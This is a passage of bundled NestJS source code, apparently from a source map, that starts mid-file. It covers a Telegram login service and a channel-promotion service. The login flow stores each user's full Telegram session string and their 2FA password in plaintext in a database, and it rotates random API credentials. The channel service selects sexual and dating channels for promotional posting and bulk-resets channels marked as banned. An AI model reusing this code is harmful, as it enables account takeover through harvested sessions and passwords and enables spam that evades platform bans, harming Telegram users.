client.setLogLevel(LogLevel.ERROR);\r\n\r\n            await client.connect();\r\n\r\n            const sendResult = await client.invoke(\r\n                new Api.auth.SendCode({\r\n                    phoneNumber: phone,\r\n                    apiId,\r\n                    apiHash,\r\n                    settings: new Api.CodeSettings({\r\n                        currentNumber: true,\r\n                        allowAppHash: true,\r\n                    }),\r\n                })\r\n            );\r\n\r\n            if (sendResult instanceof Api.auth.SentCodeSuccess) {\r\n                this.logger.error(`Unexpected immediate login for ${phone}`);\r\n                throw new BadRequestException('Unexpected immediate login');\r\n            }\r\n            const timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService.LOGIN_TIMEOUT);\r\n\r\n            TgSignupService.activeClients.set(phone, {\r\n                client,\r\n                phoneCodeHash: sendResult.phoneCodeHash,\r\n                timeoutId,\r\n                createdAt: Date.now()\r\n            });\r\n\r\n            return {\r\n                phoneCodeHash: sendResult.phoneCodeHash,\r\n                isCodeViaApp: sendResult.type instanceof Api.auth.SentCodeTypeApp,\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`Failed to send code to ${phone}: ${error.message}`, error.stack);\r\n            await this.disconnectClient(phone);\r\n            \r\n            if (error.errorMessage?.includes('PHONE_NUMBER_BANNED')) {\r\n                throw new BadRequestException('This phone number has been banned from Telegram');\r\n            }\r\n            if (error.errorMessage?.includes('PHONE_NUMBER_INVALID')) {\r\n                throw new BadRequestException('Please enter a valid phone number');\r\n            }\r\n            if (error.errorMessage?.includes('FLOOD_WAIT')) {\r\n                throw new BadRequestException('Please wait a few minutes before trying again');\r\n            }\r\n            \r\n            throw new BadRequestException('Unable to send OTP. Please try again');\r\n        }\r\n    }\r\n\r\n    async verifyCode(phone: string, code: string, password?: string): Promise<TgSignupResponse> {\r\n        try {\r\n            phone = this.validatePhoneNumber(phone);\r\n\r\n            const session = TgSignupService.activeClients.get(phone);\r\n            if (!session) {\r\n                this.logger.warn(`No active signup session found for ${phone}`);\r\n                throw new BadRequestException('Session Expired. Please start again');\r\n            }\r\n\r\n            // Always extend session timeout on verification attempt, regardless of success\r\n            clearTimeout(session.timeoutId);\r\n            session.timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService.LOGIN_TIMEOUT);\r\n\r\n            if (!session.client?.connected) {\r\n                try {\r\n                    await session.client?.connect();\r\n                } catch (error) {\r\n                    // Don't disconnect, just try to reconnect\r\n                    this.logger.warn(`Connection lost for ${phone}, attempting to reconnect`);\r\n                    try {\r\n                        const { apiId, apiHash } = this.getRandomCredentials();\r\n                        const newSession = new StringSession('');\r\n                        const newClient = new TelegramClient(newSession, apiId, apiHash, {\r\n                            connectionRetries: 5,\r\n                            retryDelay: 2000,\r\n                            useWSS: true,\r\n                            timeout: 30000\r\n                        });\r\n                        await newClient.connect();\r\n                        session.client = newClient;\r\n                    } catch (reconnectError) {\r\n                        throw new BadRequestException('Connection failed. Please try verifying again.');\r\n                    }\r\n                }\r\n            }\r\n\r\n            const { client, phoneCodeHash } = session;\r\n\r\n            try {\r\n                this.logger.debug(`Attempting to sign in with code for ${phone}`);\r\n                const signInResult = await client.invoke(\r\n                    new Api.auth.SignIn({\r\n                        phoneNumber: phone,\r\n                        phoneCodeHash,\r\n                        phoneCode: code,\r\n                    })\r\n                ) as Api.auth.Authorization;\r\n\r\n                if (!signInResult) {\r\n                    throw new BadRequestException('Invalid response from Telegram server');\r\n                }\r\n\r\n                if (signInResult instanceof Api.auth.AuthorizationSignUpRequired) {\r\n                    this.logger.log(`New user registration required for ${phone}`);\r\n                    const result = await this.handleNewUserRegistration(phone, client, phoneCodeHash);\r\n                    await this.disconnectClient(phone);\r\n                    return result;\r\n                }\r\n\r\n                // Store the session string before processing\r\n                const sessionString = client.session.save() as unknown as string;\r\n                if (!sessionString) {\r\n                    throw new Error('Failed to generate session string');\r\n                }\r\n\r\n                const userData = await this.processLoginResult(signInResult.user, sessionString, password);\r\n                await this.disconnectClient(phone);\r\n                return userData;\r\n            } catch (error) {\r\n                if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {\r\n                    this.logger.warn(`2FA required for ${phone}`);\r\n                    if (!password) {\r\n                        return {\r\n                            status: 400,\r\n                            message: 'Two-factor authentication required',\r\n                            requires2FA: true\r\n                        };\r\n                    }\r\n                    return await this.handle2FALogin(phone, session.client, password);\r\n                }\r\n                if (error.errorMessage?.includes('PHONE_CODE_INVALID') ||\r\n                    error.errorMessage?.includes('PHONE_CODE_EXPIRED')) {\r\n                    throw new BadRequestException('Invalid OTP,  Try again!');\r\n                }\r\n\r\n                this.logger.warn(`Verification attempt failed for ${phone}: ${error.message}`);\r\n                throw new BadRequestException('Verification failed. Please try again.');\r\n            }\r\n        } catch (error) {\r\n            this.logger.error(`Verification error for ${phone}: ${error.message}`);\r\n\r\n            if (error.message?.includes('No active signup session') ||\r\n                error.message?.includes('Connection failed')) {\r\n                await this.disconnectClient(phone);\r\n            }\r\n\r\n            throw error instanceof BadRequestException ? error :\r\n                new BadRequestException(error.message || 'Verification failed, please try again');\r\n        }\r\n    }\r\n\r\n    private async handle2FALogin(phone: string, client: TelegramClient, password: string): Promise<TgSignupResponse> {\r\n        try {\r\n            this.logger.debug(`Fetching password SRP parameters for ${phone}`);\r\n            const passwordSrpResult = await client.invoke(new Api.account.GetPassword());\r\n\r\n            this.logger.debug(`Computing password check for ${phone}`);\r\n            const passwordCheck = await computeCheck(passwordSrpResult, password);\r\n\r\n            this.logger.debug(`Invoking CheckPassword API for ${phone}`);\r\n            const signInResult = await client.invoke(\r\n                new Api.auth.CheckPassword({\r\n                    password: passwordCheck,\r\n                })\r\n            ) as Api.auth.Authorization;\r\n\r\n            if (!signInResult || !signInResult.user) {\r\n                throw new BadRequestException('Invalid response from Telegram server');\r\n            }\r\n\r\n            this.logger.log(`2FA login successful for ${phone}`);\r\n            const sessionString = client.session.save() as unknown as string;\r\n            if (!sessionString) {\r\n                throw new Error('Failed to generate session string');\r\n            }\r\n\r\n            const userData = await this.processLoginResult(signInResult.user, sessionString, password);\r\n            await this.disconnectClient(phone);\r\n            return userData;\r\n        } catch (error) {\r\n            this.logger.error(`2FA login failed for ${phone}: ${error.message}`, error.stack);\r\n            if (password) {\r\n                throw new BadRequestException('Incorrect 2FA password');\r\n            }\r\n            throw new BadRequestException('2FA password required');\r\n        }\r\n    }\r\n\r\n    private async handleNewUserRegistration(\r\n        phone: string,\r\n        client: TelegramClient,\r\n        phoneCodeHash: string\r\n    ): Promise<TgSignupResponse> {\r\n        try {\r\n            const randomName = `User${Math.random().toString(36).substring(2, 8)}`;\r\n            const signUpResult = await client.invoke(\r\n                new Api.auth.SignUp({\r\n                    phoneNumber: phone,\r\n                    phoneCodeHash,\r\n                    firstName: randomName,\r\n                    lastName: '', // Keep empty for privacy\r\n                })\r\n            ) as Api.auth.Authorization;\r\n\r\n            if (!signUpResult || !signUpResult.user) {\r\n                throw new BadRequestException('Invalid response from Telegram server');\r\n            }\r\n\r\n            const sessionString = client.session.save() as unknown as string;\r\n            if (!sessionString) {\r\n                throw new Error('Failed to generate session string');\r\n            }\r\n\r\n            return await this.processLoginResult(signUpResult.user, sessionString);\r\n        } catch (error) {\r\n            const errorDetails = parseError(error, \"TGSIGNUP\", false);\r\n            this.logger.error(`Failed to register new user: ${errorDetails.message}`);\r\n            throw new BadRequestException(errorDetails.message || 'Failed to register new user');\r\n        }\r\n    }\r\n\r\n    private async processLoginResult(user: any, sessionString: string, password?: string): Promise<TgSignupResponse> {\r\n        try {\r\n            if (!user || !sessionString) {\r\n                throw new Error('Invalid user data or session string');\r\n            }\r\n\r\n            // Add additional user metadata\r\n            const now = new Date();\r\n            const userData: CreateUserDto = {\r\n                mobile: user.phone?.toString()?.replace(/^\\+/, '') || '',\r\n                session: sessionString,\r\n                firstName: user.firstName || '',\r\n                lastName: user.lastName || '',\r\n                username: user.username || '',\r\n                tgId: user.id?.toString() || '',\r\n                twoFA: !!password,\r\n                password: password || null,\r\n                lastActive: now.toISOString().split('T')[0],\r\n                expired: false,\r\n                channels: 0,\r\n                personalChats: 0,\r\n                totalChats: 0,\r\n                otherPhotoCount: 0,\r\n                ownPhotoCount: 0,\r\n                ownVideoCount: 0,\r\n                otherVideoCount: 0,\r\n                recentUsers: [],\r\n                calls: {\r\n                    chatCallCounts: [],\r\n                    incoming: 0,\r\n                    outgoing: 0,\r\n                    totalCalls: 0,\r\n                    video: 0,\r\n                },\r\n                contacts: 0,\r\n                movieCount: 0,\r\n                msgs: 0,\r\n                photoCount: 0,\r\n                videoCount: 0,\r\n                gender: 'unknown',\r\n            };\r\n\r\n            // Validate required fields\r\n            if (!userData.mobile || !userData.tgId) {\r\n                throw new Error('Invalid user data received from Telegram');\r\n            }\r\n\r\n            await this.usersService.create(userData);\r\n\r\n            return {\r\n                status: 200,\r\n                message: 'Registration successful',\r\n                session: sessionString,\r\n            };\r\n        } catch (error) {\r\n            this.logger.error('Error processing login result:', error);\r\n            if (error instanceof BadRequestException) {\r\n                throw error;\r\n            }\r\n            throw new InternalServerErrorException('Failed to complete registration');\r\n        }\r\n    }\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\nimport { IsString, IsNotEmpty, IsOptional, Matches, MinLength } from 'class-validator';\r\n\r\nexport class SendCodeDto {\r\n    @ApiProperty({\r\n        description: 'Phone number to send the verification code to (international format)',\r\n        example: '+919876543210'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\+\\d{8,15}$/, { message: 'Invalid phone number format' })\r\n    phone: string;\r\n}\r\n\r\nexport class VerifyCodeDto {\r\n    @ApiProperty({\r\n        description: 'Phone number used for verification (international format)',\r\n        example: '919876543210'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\+\\d{8,15}$/, { message: 'Invalid phone number format' })\r\n    phone: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Verification code received',\r\n        example: '12345'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\d{5}$/, { message: 'Code must be exactly 5 digits' })\r\n    code: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Two-factor authentication password if required',\r\n        example: 'yourSecurePassword123',\r\n        required: false\r\n    })\r\n    @IsString()\r\n    @IsOptional()\r\n    @Transform(({ value }) => value === '' ? undefined : value)\r\n    password?: string | undefined;\r\n\r\n}\r\n\r\nexport class TgSignupResponse {\r\n    @ApiProperty({\r\n        description: 'Operation status code',\r\n        example: 200\r\n    })\r\n    status: number;\r\n\r\n    @ApiProperty({\r\n        description: 'Response message',\r\n        example: 'Login successful'\r\n    })\r\n    message: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Phone code hash for verification',\r\n        example: 'abc123xyz',\r\n        required: false\r\n    })\r\n    phoneCodeHash?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Whether the code was sent via app',\r\n        example: true,\r\n        required: false\r\n    })\r\n    isCodeViaApp?: boolean;\r\n\r\n    @ApiProperty({\r\n        description: 'Session string for authenticated client',\r\n        required: false\r\n    })\r\n    session?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Whether 2FA is required',\r\n        example: false,\r\n        required: false\r\n    })\r\n    requires2FA?: boolean;\r\n}","import { Controller, Post, Body, BadRequestException, HttpException, UseGuards, Logger, HttpStatus, ValidationPipe, UsePipes } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiExtraModels } from '@nestjs/swagger';\r\nimport { TgSignupService } from './TgSignup.service';\r\nimport { SendCodeDto, VerifyCodeDto, TgSignupResponse } from './dto/tg-signup.dto';\r\nimport { parseError } from '../../utils/parseError';\r\n\r\n@Controller('tgsignup')\r\n@ApiTags('tgsignup')\r\n@UsePipes(new ValidationPipe({\r\n    transform: true,\r\n    whitelist: true,\r\n    forbidNonWhitelisted: true,\r\n    transformOptions: { enableImplicitConversion: true }\r\n}))\r\n@ApiExtraModels(SendCodeDto, VerifyCodeDto, TgSignupResponse)\r\nexport class TgSignupController {\r\n    private readonly logger = new Logger(TgSignupController.name);\r\n\r\n    constructor(private readonly tgSignupService: TgSignupService) { }\r\n\r\n    @Post('send-code')\r\n    @ApiOperation({\r\n        summary: 'Send verification code to phone number',\r\n        description: 'Initiates the signup process by sending a verification code via Telegram'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.CREATED,\r\n        type: TgSignupResponse,\r\n        description: 'Code sent successfully'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.BAD_REQUEST,\r\n        description: 'Invalid phone number or failed to send code',\r\n        schema: {\r\n            type: 'object',\r\n            properties: {\r\n                statusCode: { type: 'number', example: 400 },\r\n                message: { type: 'string', example: 'Invalid phone number format' },\r\n                error: { type: 'string', example: 'Bad Request' }\r\n            }\r\n        }\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.TOO_MANY_REQUESTS,\r\n        description: 'Rate limit exceeded'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.INTERNAL_SERVER_ERROR,\r\n        description: 'Internal server error occurred'\r\n    })\r\n    async sendCode(@Body() sendCodeDto: SendCodeDto): Promise<TgSignupResponse> {\r\n        try {\r\n            this.logger.debug(`[SEND_CODE] Request received for phone: ${sendCodeDto.phone}`);\r\n            const result = await this.tgSignupService.sendCode(sendCodeDto.phone);\r\n\r\n            return {\r\n                status: HttpStatus.CREATED,\r\n                message: 'Code sent to your Telegram App',\r\n                phoneCodeHash: result.phoneCodeHash,\r\n                isCodeViaApp: result.isCodeViaApp\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`[SEND_CODE] Error for phone: ${sendCodeDto.phone}`, {\r\n                error,\r\n                stack: error.stack\r\n            });\r\n\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    @Post('verify')\r\n    @ApiOperation({\r\n        summary: 'Verify code and complete signup/login',\r\n        description: 'Verifies the code sent to phone and completes the signup/login process'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.OK,\r\n        type: TgSignupResponse,\r\n        description: 'Verification successful'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.BAD_REQUEST,\r\n        description: 'Invalid code or verification failed'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.TOO_MANY_REQUESTS,\r\n        description: 'Rate limit exceeded'\r\n    })\r\n    @ApiResponse({\r\n        status: HttpStatus.INTERNAL_SERVER_ERROR,\r\n        description: 'Internal server error occurred'\r\n    })\r\n    async verifyCode(@Body() verifyCodeDto: VerifyCodeDto): Promise<TgSignupResponse> {\r\n        try {\r\n            this.logger.debug(`[VERIFY_CODE] Request received for phone: ${verifyCodeDto.phone}`);\r\n            \r\n            const result = await this.tgSignupService.verifyCode(\r\n                verifyCodeDto.phone,\r\n                verifyCodeDto.code,\r\n                verifyCodeDto.password\r\n            );\r\n\r\n            return {\r\n                status: result.requires2FA ? HttpStatus.BAD_REQUEST : HttpStatus.OK,\r\n                message: result.message || 'Successfully logged in',\r\n                session: result.session,\r\n                requires2FA: result.requires2FA\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`[VERIFY_CODE] Error for phone: ${verifyCodeDto.phone}`, {\r\n                error,\r\n                stack: error.stack\r\n            });\r\n\r\n            throw error;\r\n        }\r\n    }\r\n}\r\n","// src/activechannels/activechannels.controller.ts\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\nimport { ActiveChannelsService } from './active-channels.service';\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\nimport { ActiveChannel } from './schemas/active-channel.schema';\nimport { AddReactionDto } from './dto/add-reaction.dto';\n\n@ApiTags('Active Channels')\n@Controller('active-channels')\nexport class ActiveChannelsController {\n  constructor(private readonly activeChannelsService: ActiveChannelsService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new active channel' })\n  async create(@Body() createActiveChannelDto: CreateActiveChannelDto) {\n    return this.activeChannelsService.create(createActiveChannelDto);\n  }\n\n  @Post('createMultiple')\n  @ApiOperation({ summary: 'Create multiple channels' })\n  @ApiBody({ type: [CreateActiveChannelDto] })\n  async createMultiple(@Body() createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\n    return this.activeChannelsService.createMultiple(createChannelDtos);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search channels by filters' })\n  @ApiQuery({ name: 'channelId', required: false, type: String })\n  @ApiQuery({ name: 'broadcast', required: false, type: Boolean })\n  @ApiQuery({ name: 'canSendMsgs', required: false, type: Boolean })\n  @ApiQuery({ name: 'participantsCount', required: false, type: Number })\n  @ApiQuery({ name: 'restricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'sendMessages', required: false, type: Boolean })\n  @ApiQuery({ name: 'title', required: false, type: String })\n  @ApiQuery({ name: 'username', required: false, type: String })\n  @ApiQuery({ name: 'wordRestriction', required: false, type: Number })\n  @ApiQuery({ name: 'dMRestriction', required: false, type: Number })\n  @ApiQuery({ name: 'availableMsgs', required: false, type: [String] })\n  @ApiQuery({ name: 'reactions', required: false, type: [String] })\n  @ApiQuery({ name: 'banned', required: false, type: Boolean })\n  @ApiQuery({ name: 'reactRestricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'megagroup', required: false, type: Boolean })\n  search(@Query() query: any): Promise<ActiveChannel[]> {\n    console.log(query);\n    return this.activeChannelsService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all active channels' })\n  async findAll() {\n    return this.activeChannelsService.findAll();\n  }\n\n  @Get(':channelId')\n  @ApiOperation({ summary: 'Get an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'Return the active channel', type: ActiveChannel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async findOne(@Param('channelId') channelId: string) {\n    return this.activeChannelsService.findOne(channelId);\n  }\n\n  @Patch(':channelId')\n  @ApiOperation({ summary: 'Update an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: ActiveChannel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async update(@Param('channelId') channelId: string, @Body() updateActiveChannelDto: UpdateActiveChannelDto) {\n    return this.activeChannelsService.update(channelId, updateActiveChannelDto);\n  }\n\n  @Delete(':channelId')\n  @ApiOperation({ summary: 'Delete an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async remove(@Param('channelId') channelId: string) {\n    return this.activeChannelsService.remove(channelId);\n  }\n\n  @Post(':channelId/reactions')\n  @ApiOperation({ summary: 'Add reaction to chat group' })\n  addReaction(@Param('channelId') channelId: string, @Body() addReactionDto: AddReactionDto): Promise<ActiveChannel> {\n    if (!addReactionDto.reactions) {\n      throw new BadRequestException('Reaction is required');\n    }\n    return this.activeChannelsService.addReactions(channelId, addReactionDto.reactions);\n  }\n\n  @Get(':channelId/reactions/random')\n  @ApiOperation({ summary: 'Get a random reaction from chat group' })\n  getRandomReaction(@Param('channelId') channelId: string): Promise<string> {\n    return this.activeChannelsService.getRandomReaction(channelId);\n  }\n\n  @Delete(':channelId/reactions')\n  @ApiOperation({ summary: 'Remove reaction from chat group' })\n  removeReaction(@Param('channelId') channelId: string, @Body() addReactionDto: AddReactionDto): Promise<ActiveChannel> {\n    if (!addReactionDto.reactions) {\n      throw new BadRequestException('Reaction is required');\n    }\n    return this.activeChannelsService.removeReaction(channelId, addReactionDto.reactions[0]);\n  }\n}\n","// src/activechannels/activechannels.module.ts\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ActiveChannelsService } from './active-channels.service';\nimport { ActiveChannelsController } from './active-channels.controller';\nimport { ActiveChannel, ActiveChannelSchema } from './schemas/active-channel.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { PromoteMsgModule } from '../promote-msgs/promote-msgs.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: ActiveChannel.name, schema: ActiveChannelSchema }]),\n    PromoteMsgModule\n  ],\n  controllers: [ActiveChannelsController],\n  providers: [ActiveChannelsService],\n  exports: [ActiveChannelsService]\n})\nexport class ActiveChannelsModule { }\n","import { PromoteMsgsService } from './../promote-msgs/promote-msgs.service';\n// src/activechannels/activechannels.service.ts\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\nimport { ActiveChannel, ActiveChannelDocument } from './schemas/active-channel.schema';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n\n@Injectable()\nexport class ActiveChannelsService {\n  constructor(\n    @InjectModel(ActiveChannel.name) private activeChannelModel: Model<ActiveChannelDocument>,\n    @Inject(forwardRef(() => PromoteMsgsService))\n    private promoteMsgsService: PromoteMsgsService\n  ) {}\n\n  async create(createActiveChannelDto: CreateActiveChannelDto): Promise<ActiveChannel> {\n    createActiveChannelDto.availableMsgs = Object.keys(await this.promoteMsgsService.findOne())\n    const createdChannel = new this.activeChannelModel(createActiveChannelDto);\n    return createdChannel.save();\n  }\n\n  \n  async createMultiple(createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\n    const bulkOps = createChannelDtos.map((dto) => ({\n      updateOne: {\n        filter: { channelId: dto.channelId },\n        update: { $set: dto },\n        upsert: true\n      }\n    }));\n\n    await this.activeChannelModel.bulkWrite(bulkOps, { ordered: false });\n    return 'Channels Saved';\n  }\n\n  async findAll(): Promise<ActiveChannel[]> {\n    return this.activeChannelModel.find().exec();\n  }\n\n  async findOne(channelId: string): Promise<ActiveChannel> {\n    const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();\n    return channel;\n  }\n\n  async update(channelId: string, updateActiveChannelDto: UpdateActiveChannelDto): Promise<ActiveChannel> {\n    delete updateActiveChannelDto[\"_id\"]\n    const updatedChannel = await this.activeChannelModel.findOneAndUpdate(\n      { channelId },\n      { $set: updateActiveChannelDto },\n      { new: true, upsert: true },\n    ).exec();\n    return updatedChannel;\n  }\n\n  async removeFromAvailableMsgs(channelId: string, msg: string) {\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $pull: { availableMsgs: msg } })\n  }\n\n  async addToAvailableMsgs(channelId: string, msg: string) {\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $addToSet: { availableMsgs: msg } })\n  }\n\n  async remove(channelId: string): Promise<void> {\n    const result = await this.activeChannelModel.findOneAndDelete({ channelId }).exec();\n  }\n\n  async search(filter: any): Promise<ActiveChannel[]> {\n    console.log(filter)\n    return this.activeChannelModel.find(filter).exec();\n  }\n\n  async addReactions(channelId: string, reactions: string[]): Promise<ActiveChannel> {\n    const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {\n      $addToSet: { reactions: reactions }\n    })\n    return channel;\n  }\n\n  async getRandomReaction(channelId: string): Promise<string> {\n    const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();\n    if (!channel) {\n      return undefined;\n    }\n    if (channel.reactions.length === 0) {\n      return undefined;\n    }\n    const randomIndex = Math.floor(Math.random() * channel.reactions.length);\n    return channel.reactions[randomIndex];\n  }\n\n  async removeReaction(channelId: string, reaction: string): Promise<ActiveChannel> {\n    const channel = await this.activeChannelModel.findOneAndUpdate({ channelId }, {\n      $pull: { reactions: reaction },\n    })\n    return channel;\n  }\n\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\n    const query = {\n      '$and':\n        [\n          {\n            '$or':\n              [\n                { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n                { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n              ]\n          },\n          {\n            '$or': [\n              { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n              { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n            ]\n          },\n          {\n            channelId: { '$nin': notIds },\n            participantsCount: { $gt: 600 },\n            username: {$ne: null},\n            canSendMsgs: true,\n            restricted: false,\n            forbidden: false\n          }\n        ]\n    }\n\n    const sort: Record<string, 1 | -1> = { participantsCount: -1 }\n    try {\n      const result: ActiveChannel[] = await this.activeChannelModel.aggregate([\n        { $match: query },\n        { $skip: skip },\n        { $limit: limit },\n        { $sort: sort }, // Sort by the random field\n        { $project: { randomField: 0 } } // Remove the random field from the output\n      ]).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<ActiveChannel[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.activeChannelModel.find(query);\n\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      if (skip) {\n        queryExec.skip(skip);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n  async resetWordRestrictions() {\n    await fetchWithTimeout(`${notifbot()}&text=Request Received for Reset Available Msgs`);\n    try {\n      await this.activeChannelModel.updateMany({\n        banned: false\n      }, {\n        $set: {\n          \"wordRestriction\": 0,\n          \"dMRestriction\": 0\n        }\n      })\n    } catch (e) {\n      console.log(parseError(e))\n    }\n  }\n\n  async resetAvailableMsgs() {\n    await fetchWithTimeout(`${notifbot()}&text=Request Received for Reset Available Msgs`);\n    try {\n      const data = await this.promoteMsgsService.findOne();\n      const keys = Object.keys(data);\n      await this.activeChannelModel.updateMany(\n        {\n          $expr: {\n            $lt: [{ $size: { $ifNull: [\"$availableMsgs\", []] } }, 5]\n          }\n        },\n        {\n          $set: {\n            \"wordRestriction\": 0,\n            \"dMRestriction\": 0,\n            \"banned\": false,\n            \"availableMsgs\": keys\n          }\n        }\n      );\n    } catch (e) {\n      console.log(parseError(e))\n    }\n  }\n\n  async updateBannedChannels() {\n    await fetchWithTimeout(`${notifbot()}&text=Request Received for update banned Channels`);\n    await this.activeChannelModel.updateMany({ $or: [{ banned: true }, { private: true }] }, {\n      $set: {\n        \"wordRestriction\": 0,\n        \"dMRestriction\": 0,\n        banned: false,\n        \"private\": false\n      }\n    })\n  }\n\n  async updateDefaultReactions() {\n    await this.activeChannelModel.updateMany({}, {\n      $set: {\n        reactions: [\n          '❤', '🔥', '👏', '🥰', '😁', '🤔',\n          '🤯', '😱', '🤬', '😢', '🎉', '🤩',\n          '🤮', '💩', '🙏', '👌', '🕊', '🤡',\n          '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\n          '🤣', '💔', '🏆', '😭', '😴', '👍',\n          '🌚', '⚡', '🍌', '😐', '💋', '👻',\n          '👀', '🙈', '🤝', '🤗', '🆒',\n          '🗿', '🙉', '🙊', '🤷', '👎'\n        ]\n      }\n    })\n  }\n}\n","import { ApiProperty,  } from '@nestjs/swagger';\n\nexport class AddReactionDto  {\n    @ApiProperty({required: true})\n    reactions: string[]\n}\n","// src/activechannels/dto/create-activechannel.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateActiveChannelDto {\n  @ApiProperty()\n  channelId: string;\n\n  @ApiProperty({ default: false })\n  broadcast: boolean;\n\n  @ApiProperty({ default: true })\n  canSendMsgs: boolean;\n\n  @ApiProperty({ default: 300 })\n  participantsCount: number;\n\n  @ApiProperty({ default: false })\n  restricted: boolean;\n\n  @ApiProperty({ default: true })\n  sendMessages: boolean;\n\n  @ApiProperty({ default: false })\n  reactRestricted?: boolean = false;\n\n  @ApiProperty()\n  title: string;\n\n  @ApiProperty()\n  username: string;\n\n  @ApiProperty({ default: 0 })\n  wordRestriction?: number = 0;\n\n  @ApiProperty({ default: 0 })\n  dMRestriction?: number = 0;\n\n  @ApiProperty({ type: [String] })\n  availableMsgs?: string[];\n\n  @ApiProperty({\n    type: [String], default: [\n      '❤', '🔥', '👏', '🥰', '😁', '🤔',\n      '🤯', '😱', '🤬', '😢', '🎉', '🤩',\n      '🤮', '💩', '🙏', '👌', '🕊', '🤡',\n      '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\n      '🤣', '💔', '🏆', '😭', '😴', '👍',\n      '🌚', '⚡', '🍌', '😐', '💋', '👻',\n      '👀', '🙈', '🤝', '🤗', 